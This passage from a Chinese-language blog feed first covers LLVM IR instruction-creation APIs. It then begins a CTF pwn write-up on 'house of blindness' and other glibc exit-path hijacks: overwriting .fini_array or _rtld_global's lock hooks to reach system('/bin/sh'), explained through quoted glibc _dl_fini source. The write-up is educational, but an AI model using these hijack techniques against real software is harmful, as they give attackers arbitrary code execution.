retVal, InsertAtEnd);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> ReturnInst* <span class="hljs-title">Create</span><span class="hljs-params">(LLVMContext &amp;C, BasicBlock *InsertAtEnd)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span>(<span class="hljs-number">0</span>) <span class="hljs-built_in">ReturnInst</span>(C, InsertAtEnd);<br>  &#125;<br></code></pre></td></tr></table></figure><p>🌰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">ReturnInst::<span class="hljs-built_in">Create</span>(context, ld20, block15);<br></code></pre></td></tr></table></figure><h2 id="call"><a href="#call" class="headerlink" title="call"></a>call</h2><p>CallInst，CallBase有自己的data域</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs cpp">$<span class="hljs-number">3</span> = &#123;<br>  &lt;llvm::CallBase&gt; = &#123;<br>    &lt;llvm::Instruction&gt; = &#123;<br>      &lt;llvm::User&gt; = &#123;<br>        &lt;llvm::Value&gt; = &#123;<br>          VTy = <span class="hljs-number">0x466d80</span>,<br>          UseList = <span class="hljs-number">0x0</span>,<br>          SubclassID = <span class="hljs-number">82</span> <span class="hljs-string">&#x27;R&#x27;</span>,<br>          HasValueHandle = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>          SubclassOptionalData = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>          SubclassData = <span class="hljs-number">0</span>,<br>          NumUserOperands = <span class="hljs-number">3</span>,<br>          IsUsedByMD = <span class="hljs-number">0</span>,<br>          HasName = <span class="hljs-number">0</span>,<br>          HasMetadata = <span class="hljs-number">0</span>,<br>          HasHungOffUses = <span class="hljs-number">0</span>,<br>          HasDescriptor = <span class="hljs-number">0</span>,<br>          <span class="hljs-type">static</span> MaxAlignmentExponent = <span class="hljs-number">29</span>,<br>          <span class="hljs-type">static</span> MaximumAlignment = <span class="hljs-number">536870912</span><br>        &#125;, &lt;No data fields&gt;&#125;, <br>      &lt;llvm::ilist_node_with_parent&lt;llvm::Instruction, llvm::BasicBlock&gt;&gt; = &#123;<br>        &lt;llvm::ilist_node&lt;llvm::Instruction&gt;&gt; = &#123;<br>          &lt;llvm::ilist_node_impl&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-type">void</span>&gt; &gt;&gt; = &#123;<br>            &lt;llvm::ilist_node_base&lt;<span class="hljs-literal">false</span>&gt;&gt; = &#123;<br>              Prev = <span class="hljs-number">0x0</span>,<br>              Next = <span class="hljs-number">0x0</span><br>            &#125;, &lt;No data fields&gt;&#125;, &lt;No data fields&gt;&#125;, &lt;No data fields&gt;&#125;, <br>      members of llvm::Instruction:<br>      Parent = <span class="hljs-number">0x0</span>,<br>      DbgLoc = &#123;<br>        Loc = &#123;<br>          Ref = &#123;<br>            MD = <span class="hljs-number">0x0</span><br>          &#125;<br>        &#125;<br>      &#125;,<br>      Order = <span class="hljs-number">0</span><br>    &#125;, <br>    members of llvm::CallBase:<br>    <span class="hljs-type">static</span> CalledOperandOpEndIdx = <span class="hljs-number">-1</span>,<br>    Attrs = &#123;<br>      pImpl = <span class="hljs-number">0x0</span><br>    &#125;,<br>    FTy = <span class="hljs-number">0x46aed0</span><br>  &#125;, &lt;No data fields&gt;&#125;<br></code></pre></td></tr></table></figure><p>好多重载（</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionType *Ty, Value *F, <span class="hljs-type">const</span> Twine &amp;NameStr = <span class="hljs-string">&quot;&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span> (<span class="hljs-built_in">ComputeNumOperands</span>(<span class="hljs-number">0</span>)) <span class="hljs-built_in">CallInst</span>(Ty, F, NameStr, InsertBefore);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionType *Ty, Value *Func, ArrayRef&lt;Value *&gt; Args,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;NameStr,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span> (<span class="hljs-built_in">ComputeNumOperands</span>(Args.<span class="hljs-built_in">size</span>()))<br>        <span class="hljs-built_in">CallInst</span>(Ty, Func, Args, None, NameStr, InsertBefore);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionType *Ty, Value *Func, ArrayRef&lt;Value *&gt; Args,</span></span><br><span class="hljs-params"><span class="hljs-function">                          ArrayRef&lt;OperandBundleDef&gt; Bundles = None,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;NameStr = <span class="hljs-string">&quot;&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> NumOperands =<br>        <span class="hljs-built_in">ComputeNumOperands</span>(Args.<span class="hljs-built_in">size</span>(), <span class="hljs-built_in">CountBundleInputs</span>(Bundles));<br>    <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> DescriptorBytes = Bundles.<span class="hljs-built_in">size</span>() * <span class="hljs-built_in">sizeof</span>(BundleOpInfo);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span> (NumOperands, DescriptorBytes)<br>        <span class="hljs-built_in">CallInst</span>(Ty, Func, Args, Bundles, NameStr, InsertBefore);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionType *Ty, Value *F, <span class="hljs-type">const</span> Twine &amp;NameStr,</span></span><br><span class="hljs-params"><span class="hljs-function">                          BasicBlock *InsertAtEnd)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span> (<span class="hljs-built_in">ComputeNumOperands</span>(<span class="hljs-number">0</span>)) <span class="hljs-built_in">CallInst</span>(Ty, F, NameStr, InsertAtEnd);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionType *Ty, Value *Func, ArrayRef&lt;Value *&gt; Args,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;NameStr, BasicBlock *InsertAtEnd)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span> (<span class="hljs-built_in">ComputeNumOperands</span>(Args.<span class="hljs-built_in">size</span>()))<br>        <span class="hljs-built_in">CallInst</span>(Ty, Func, Args, None, NameStr, InsertAtEnd);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionType *Ty, Value *Func, ArrayRef&lt;Value *&gt; Args,</span></span><br><span class="hljs-params"><span class="hljs-function">                          ArrayRef&lt;OperandBundleDef&gt; Bundles,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;NameStr, BasicBlock *InsertAtEnd)</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> NumOperands =<br>        <span class="hljs-built_in">ComputeNumOperands</span>(Args.<span class="hljs-built_in">size</span>(), <span class="hljs-built_in">CountBundleInputs</span>(Bundles));<br>    <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> DescriptorBytes = Bundles.<span class="hljs-built_in">size</span>() * <span class="hljs-built_in">sizeof</span>(BundleOpInfo);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span> (NumOperands, DescriptorBytes)<br>        <span class="hljs-built_in">CallInst</span>(Ty, Func, Args, Bundles, NameStr, InsertAtEnd);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionCallee Func, <span class="hljs-type">const</span> Twine &amp;NameStr = <span class="hljs-string">&quot;&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Create</span>(Func.<span class="hljs-built_in">getFunctionType</span>(), Func.<span class="hljs-built_in">getCallee</span>(), NameStr,<br>                  InsertBefore);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionCallee Func, ArrayRef&lt;Value *&gt; Args,</span></span><br><span class="hljs-params"><span class="hljs-function">                          ArrayRef&lt;OperandBundleDef&gt; Bundles = None,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;NameStr = <span class="hljs-string">&quot;&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Create</span>(Func.<span class="hljs-built_in">getFunctionType</span>(), Func.<span class="hljs-built_in">getCallee</span>(), Args, Bundles,<br>                  NameStr, InsertBefore);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionCallee Func, ArrayRef&lt;Value *&gt; Args,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;NameStr,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Create</span>(Func.<span class="hljs-built_in">getFunctionType</span>(), Func.<span class="hljs-built_in">getCallee</span>(), Args, NameStr,<br>                  InsertBefore);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionCallee Func, <span class="hljs-type">const</span> Twine &amp;NameStr,</span></span><br><span class="hljs-params"><span class="hljs-function">                          BasicBlock *InsertAtEnd)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Create</span>(Func.<span class="hljs-built_in">getFunctionType</span>(), Func.<span class="hljs-built_in">getCallee</span>(), NameStr,<br>                  InsertAtEnd);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionCallee Func, ArrayRef&lt;Value *&gt; Args,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;NameStr, BasicBlock *InsertAtEnd)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Create</span>(Func.<span class="hljs-built_in">getFunctionType</span>(), Func.<span class="hljs-built_in">getCallee</span>(), Args, NameStr,<br>                  InsertAtEnd);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionCallee Func, ArrayRef&lt;Value *&gt; Args,</span></span><br><span class="hljs-params"><span class="hljs-function">                          ArrayRef&lt;OperandBundleDef&gt; Bundles,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;NameStr, BasicBlock *InsertAtEnd)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Create</span>(Func.<span class="hljs-built_in">getFunctionType</span>(), Func.<span class="hljs-built_in">getCallee</span>(), Args, Bundles,<br>                  NameStr, InsertAtEnd);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">Create</span><span class="hljs-params">(CallInst *CI, ArrayRef&lt;OperandBundleDef&gt; Bundles,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Instruction *InsertPt = <span class="hljs-literal">nullptr</span>)</span></span>;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> CallInst *<span class="hljs-title">CreateWithReplacedBundle</span><span class="hljs-params">(CallInst *CI,</span></span><br><span class="hljs-params"><span class="hljs-function">                                            OperandBundleDef Bundle,</span></span><br><span class="hljs-params"><span class="hljs-function">                                            Instruction *InsertPt = <span class="hljs-literal">nullptr</span>)</span></span>;<br></code></pre></td></tr></table></figure><p>🌰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Function* myAddFunc = <span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getFunction</span>(<span class="hljs-string">&quot;myadd&quot;</span>);<br>Value *arg[] = &#123;old_ope-&gt;<span class="hljs-built_in">getOperand</span>(<span class="hljs-number">0</span>), old_ope-&gt;<span class="hljs-built_in">getOperand</span>(<span class="hljs-number">1</span>)&#125;;<br>CallInst *myaddCall = CallInst::<span class="hljs-built_in">Create</span>(myAddFunc, arg, <span class="hljs-string">&quot;&quot;</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>LLVM</category>
      
      <category>IR</category>
      
    </categories>
    
    
    <tags>
      
      <tag>llvm</tag>
      
      <tag>ir</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of blindness</title>
    <link href="/2023/08/23/house-of-blindness/"/>
    <url>/2023/08/23/house-of-blindness/</url>
    
    <content type="html"><![CDATA[<p>pwn手坐大牢的wm&#x2F;(ㄒoㄒ)&#x2F;~~乖乖来复现了，这题比赛的时候二十几解死活做不出来就很难受</p><p>ps：真的是house太多了买不起……</p><span id="more"></span><h1 id="其他的exit利用方法"><a href="#其他的exit利用方法" class="headerlink" title="其他的exit利用方法"></a>其他的exit利用方法</h1><h2 id="更改-fini-array"><a href="#更改-fini-array" class="headerlink" title="更改.fini_array"></a>更改.fini_array</h2><p>elf文件中会存在一个.fini_array段</p><img src="/2023/08/23/house-of-blindness/fini.png" class title="fini"><p>在exit的时候会调用__do_global_dtors_aux_fini_array_entry指向的函数__do_global_dtors_aux</p><p>所以可以更改__do_global_dtors_aux_fini_array_entry的内容为system(‘&#x2F;bin&#x2F;sh’)，之前见过一道用这种方法进行循环执行的题（但只能循环一次）</p><h2 id="rtld-lock-unlock-recursive劫持"><a href="#rtld-lock-unlock-recursive劫持" class="headerlink" title="__rtld_lock_unlock_recursive劫持"></a>__rtld_lock_unlock_recursive劫持</h2><p>exit的时候存在调用流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">exit</span>-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;_rtld_global._dl_rtld_lock_recursive<br>-&gt;_rtld_global._dl_rtld_unlock_recursive<br></code></pre></td></tr></table></figure><p>所以可以更改_rtld_global的_dl_rtld_unlock_recursive成员或者_dl_rtld_lock_recursive成员为system地址或者one_gadget地址</p><p>调用_rtld_global._dl_rtld_lock_recursive时的参数rdi是_rtld_global._dl_load_lock.mutex，可以改为&#x2F;bin&#x2F;sh</p><img src="/2023/08/23/house-of-blindness/mutex.png" class title="mutex"><p>这道题也可以更改_rtld_global，但ld中的_rtld_global和libc中的system距离太远，存在一个4096的爆破，这概率对于我这种非酋来说等于0(╯‵□′)╯︵┻━┻</p><h1 id="house-of-blindness"><a href="#house-of-blindness" class="headerlink" title="house of blindness"></a>house of blindness</h1><p>先让我们来探究一下exit的流程，比如它到底是怎么调用.fini_array的</p><h2 id="exit调用-fini-array流程"><a href="#exit调用-fini-array流程" class="headerlink" title="exit调用.fini_array流程"></a>exit调用.fini_array流程</h2><ul><li><p>exit函数直接调用__run_exit_handlers</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">exit</span> <span class="hljs-params">(<span class="hljs-type">int</span> status)</span><br>&#123;<br>  __run_exit_handlers (status, &amp;__exit_funcs, <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>);<br>&#125;<br>libc_hidden_def (<span class="hljs-built_in">exit</span>)<br></code></pre></td></tr></table></figure></li><li><p>exit传给__run_exit_handlers的__exit_funcs指向initial</p><img src="/2023/08/23/house-of-blindness/handlers.png" class title="handlers"><img src="/2023/08/23/house-of-blindness/initial.png" class title="initial"><p>接下来__run_exit_handlers会遍历initial的fns数组，当flavor&#x3D;&#x3D;ef_cxa（4）时会解密f-&gt;func.cxa.fn指针并调用这个函数，就是_dl_fini</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span></span><br><span class="hljs-class">&#123;</span><br>  ef_free,<span class="hljs-comment">/* `ef_free&#x27; MUST be zero!  */</span><br>  ef_us,<br>  ef_on,<br>  ef_at,<br>  ef_cxa<br>&#125;;<br></code></pre></td></tr></table></figure><p>ps：我当时想过这里能不能利用，但发现这个加密后就放弃了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-keyword">case</span> ef_cxa:<br>      <span class="hljs-comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span><br><span class="hljs-comment"> we must mark this function as ef_free.  */</span><br>      f-&gt;flavor = ef_free;<br>      cxafct = f-&gt;func.cxa.fn;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>      PTR_DEMANGLE (cxafct);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      cxafct (f-&gt;func.cxa.arg, status);<br>      <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>这个加密的数据来自fs:[0x30]，和canary差不多</p></li><li><p>_dl_fini中调用_dl_rtld_lock_recursive和_dl_rtld_unlock_recursive的地方就是这里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">      <span class="hljs-comment">/* Protect against concurrent loads and unloads.  */</span><br>      __rtld_lock_lock_recursive (GL(dl_load_lock));<br><br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;<br>      <span class="hljs-comment">/* No need to do anything for empty namespaces or those used for</span><br><span class="hljs-comment"> auditing DSOs.  */</span><br>      <span class="hljs-keyword">if</span> (nloaded == <span class="hljs-number">0</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  )<br>__rtld_lock_unlock_recursive (GL(dl_load_lock));<br></code></pre></td></tr></table></figure><p>这里还有一个地址跳转</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (i-- &gt; <span class="hljs-number">0</span>)<br>((<span class="hljs-type">fini_t</span>) <span class="hljs-built_in">array</span>[i]) ();<br></code></pre></td></tr></table></figure><p>这个就是调用.fini_array的地方</p></li></ul><p>细看一下调用这个地址跳转的过程（link_map结构体介绍见ret2dlresolve）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">maps</span>[<span class="hljs-title">nloaded</span>];</span><br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span>;</span><br>  assert (nloaded != <span class="hljs-number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * 遍历_rtld_global中的所有link_map，放入maps</span><br><span class="hljs-comment"> * link_map的遍历是按照_rtld_global[i]-&gt;_ns_loaded来的，这个成员的类型是一个link_map指针</span><br><span class="hljs-comment"> * struct rtld_global</span><br><span class="hljs-comment"> * &#123;</span><br><span class="hljs-comment"> *   EXTERN struct link_namespaces</span><br><span class="hljs-comment"> *   &#123;</span><br><span class="hljs-comment"> *     struct link_map *_ns_loaded;</span><br><span class="hljs-comment"> *     unsigned int _ns_nloaded;</span><br><span class="hljs-comment"> *     ……</span><br><span class="hljs-comment"> */</span><br>  <span class="hljs-keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="hljs-number">0</span>; l != <span class="hljs-literal">NULL</span>; l = l-&gt;l_next)<br>    <span class="hljs-keyword">if</span> (l == l-&gt;l_real)<br>      &#123;<br>assert (i &lt; nloaded);<br><br>maps[i] = l;<br>l-&gt;l_idx = i;<br>++i;<br>++l-&gt;l_direct_opencount;<br>      &#125;<br>  assert (ns != LM_ID_BASE || i == nloaded);<br>  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="hljs-number">1</span>);<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nmaps = i;<br><br><span class="hljs-comment">/* 排序maps中的结构 */</span><br>  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),<br> <span class="hljs-literal">NULL</span>, <span class="hljs-literal">true</span>);<br>……<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nmaps; ++i)<br>    &#123;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span> =</span> maps[i];<br><br>      <span class="hljs-keyword">if</span> (l-&gt;l_init_called)<br>&#123;<br>  <span class="hljs-comment">/* 确保只能调用一次  */</span><br>  l-&gt;l_init_called = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">/* 确保.fini_array段或fini函数段描述符不为空 */</span><br>  <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span><br>      || l-&gt;l_info[DT_FINI] != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>              <br>     ……<br>                    <br>           <span class="hljs-comment">/* 如果.fini_array段不为空，则使用.fini_array的指针调用fini函数 */</span><br>      <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span>)<br>&#123;<br>               <span class="hljs-comment">/* 使用基址（l-&gt;l_addr）和偏移（d_un.d_ptr）计算.fini_array地址 */</span><br>  ElfW(Addr) *<span class="hljs-built_in">array</span> =<br>    (ElfW(Addr) *) (l-&gt;l_addr<br>    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);<br>  <span class="hljs-comment">/* 计算.fini_array段大小且令其=i */</span>                  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val<br>    / <span class="hljs-keyword">sizeof</span> (ElfW(Addr)));<br>  <span class="hljs-keyword">while</span> (i-- &gt; <span class="hljs-number">0</span>)<span class="hljs-comment">// 调用fini函数</span><br>    ((<span class="hljs-type">fini_t</span>) <span class="hljs-built_in">array</span>[i]) ();<br>&#125;<br>              <br>             <span class="hljs-comment">/* 如果.fini_array段为空，则直接调用fini函数 */</span><br>      <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="hljs-literal">NULL</span>)<br>DL_CALL_DT_FINI<br>  (l, l-&gt;l_addr + 